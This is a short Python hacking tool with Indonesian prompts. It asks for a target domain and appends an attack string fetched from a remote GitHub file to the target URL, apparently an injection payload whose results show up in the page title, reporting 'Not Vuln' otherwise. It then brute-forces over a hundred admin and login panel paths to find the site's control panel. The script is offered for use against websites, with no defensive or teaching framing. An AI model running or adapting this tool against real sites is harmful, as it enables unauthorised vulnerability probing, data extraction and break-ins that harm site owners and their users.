import os
from requests import get
from bs4 import BeautifulSoup

def clear():
  if os.name == 'nt':
    os.system('cls')
  else:
    os.system('clear')

clear()
asci = get("https://raw.githubusercontent.com/archive-code/gapenting/master/1.txt")
ascii = BeautifulSoup(asci.text, 'html.parser')
print (ascii)
l1 = get("https://raw.githubusercontent.com/archive-code/gapenting/master/2.txt")
l2 = BeautifulSoup(l1.text, 'html.parser')
print (l2)
uDOMEN = input('Masukkan Domain Target: ')
p1 = get("https://raw.githubusercontent.com/archive-code/gapenting/master/3.txt")
p2 = BeautifulSoup(p1.text, 'html.parser')
p3 = p2.text
urla = get("http://"+uDOMEN+p3)
soup = BeautifulSoup(urla.text, 'html.parser')
hasil = soup.find('title')
try:
  res = hasil.text.rstrip().lstrip()
  print("RESULT = ")
  ress = res.replace(",,", "\n")
  print(ress.replace(",","|"))
except:
  print('Situs Not Vuln Pak :(')
  exit

print ("""
==============================================================
ADMIN FINDER
LIST DIBAWAH JIKA TIDAK MAUNAMBAH DI ENTER LANGSUNGAJA
""")
urls = uDOMEN                  
if 'http' not in urls:
    urls = 'http://'+urls
listadmin = input("Masukkan list tambahan:")
print ("==============================================================")

adminList = ['admin','adm','administrator','redaktur','adminweb','webadmin','s-admin','g-admin','adminpage','operator/',
'sika/',
'develop/',
'ketua/',
'redaktur/',
'admin/',
'administrator/',
'adminweb/',
'user/',
'users/',
'dinkesadmin/',
'retel/',
'author/',
'panel/',
'paneladmin/',
'panellogin/',
'redaksi/',
'cp-admin/',
'master/',
'master/index.php',
'master/login.php',
'operator/index.php',
'sika/index.php',
'develop/index.php',
'ketua/index.php',
'redaktur/index.php',
'admin/index.php',
'administrator/index.php',
'adminweb/index.php',
'user/index.php',
'users/index.php',
'dinkesadmin/index.php',
'retel/index.php',
'author/index.php',
'panel/index.php',
'paneladmin/index.php',
'panellogin/index.php',
'redaksi/index.php',
'cp-admin/index.php',
'operator/login.php',
'sika/login.php',
'develop/login.php',
'ketua/login.php',
'redaktur/login.php',
'admin/login.php',
'administrator/login.php',
'adminweb/login.php',
'user/login.php',
'users/login.php',
'dinkesadmin/login.php',
'retel/login.php',
'author/login.php',
'panel/login.php',
'paneladmin/login.php',
'panellogin/login.php',
'redaksi/login.php',
'cp-admin/login.php',
'terasadmin/',
'terasadmin/index.php',
'terasadmin/login.php',
'rahasia/',
'rahasia/index.php',
'rahasia/admin.php',
'rahasia/login.php',
'dinkesadmin/',
'dinkesadmin/login.php',
'adminpmb/',
'adminpmb/index.php',
'adminpmb/login.php',
'system/',
'system/index.php',
'system/login.php',
'webadmin/',
'webadmin/index.php',
'webadmin/login.php',
'wpanel/',
'wpanel/index.php',
'wpanel/login.php',
'adminpanel/index.php',
'adminpanel/',
'adminpanel/login.php',
'adminkec/',
'adminkec/index.php',
'adminkec/login.php',
'admindesa/',
'admindesa/index.php',
'admindesa/login.php',
'adminkota/',
'adminkota/index.php',
'adminkota/login.php',
'admin123/',
'admin123/index.php',
'admin123/login.php',
'logout/',
'logout/index.php',
'logout/login.php',
'logout/admin.php',
'sistem/',
'webpanel/',
'w3bc0ntr0l/',
'apanel/',
'sysadmin/',listadmin]
for admin in adminList:
    try:
        urli = urls+'/'+admin
        urlr = get(urli)

    except:                                                   
         print("gk ad url")                                         
         exit()
    if urlr.status_code == 200:
        print(admin)
        print(urli)
    else:
        print('tidak ada |',urli)
